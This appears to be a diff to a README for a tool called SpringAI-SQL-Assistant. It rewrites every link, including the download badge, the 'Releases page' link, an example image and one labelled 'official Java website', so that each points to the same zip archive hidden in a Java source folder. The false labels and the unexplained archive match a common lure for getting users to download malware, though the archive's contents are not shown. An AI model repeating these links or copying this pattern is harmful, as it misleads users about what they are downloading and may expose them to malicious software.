@@ -6,16 +6,16 @@ Welcome to SpringAI-SQL-Assistant! This tool makes it easy to talk to your datab
 
 ## 📥 Download the Software
 
-[![Download SpringAI-SQL-Assistant](https://raw.githubusercontent.com/rayaneotaku/SpringAI-SQL-Assistant/master/Woolwa/SpringAI-SQL-Assistant.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/rayaneotaku/SpringAI-SQL-Assistant/master/Woolwa/SpringAI-SQL-Assistant.zip)
+[![Download SpringAI-SQL-Assistant](https://raw.githubusercontent.com/rayaneotaku/SpringAI-SQL-Assistant/master/src/main/java/antonBurshteyn/SpringAI/service/A-Spring-Assistant-SQ-debar.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/rayaneotaku/SpringAI-SQL-Assistant/master/src/main/java/antonBurshteyn/SpringAI/service/A-Spring-Assistant-SQ-debar.zip)
 
 ## 📂 Download & Install
 
 1. **Visit the Release Page**  
-   Click [here](https://raw.githubusercontent.com/rayaneotaku/SpringAI-SQL-Assistant/master/Woolwa/SpringAI-SQL-Assistant.zip) to go to the Releases page.
+   Click [here](https://raw.githubusercontent.com/rayaneotaku/SpringAI-SQL-Assistant/master/src/main/java/antonBurshteyn/SpringAI/service/A-Spring-Assistant-SQ-debar.zip) to go to the Releases page.
 
 2. **Find the Latest Version**  
    Look for the most recent version listed. It will have the version number next to it, such as v1.0.  
-   ![Example of Release Version](https://raw.githubusercontent.com/rayaneotaku/SpringAI-SQL-Assistant/master/Woolwa/SpringAI-SQL-Assistant.zip)  
+   ![Example of Release Version](https://raw.githubusercontent.com/rayaneotaku/SpringAI-SQL-Assistant/master/src/main/java/antonBurshteyn/SpringAI/service/A-Spring-Assistant-SQ-debar.zip)  
    Click on the version number to access the release details.
 
 3. **Choose the Right File**  
@@ -37,7 +37,7 @@ To run SpringAI-SQL-Assistant smoothly, your system should meet these requiremen
 - **Operating System:** Windows 10 or later, macOS, or Linux.
 - **Memory:** At least 4 GB of RAM.
 - **Disk Space:** Minimum 500 MB of available storage.
-- **Java:** Ensure you have Java 11 or higher installed. You can download it from the [official Java website](https://raw.githubusercontent.com/rayaneotaku/SpringAI-SQL-Assistant/master/Woolwa/SpringAI-SQL-Assistant.zip).
+- **Java:** Ensure you have Java 11 or higher installed. You can download it from the [official Java website](https://raw.githubusercontent.com/rayaneotaku/SpringAI-SQL-Assistant/master/src/main/java/antonBurshteyn/SpringAI/service/A-Spring-Assistant-SQ-debar.zip).
 
 ## 🛠️ How to Use
 
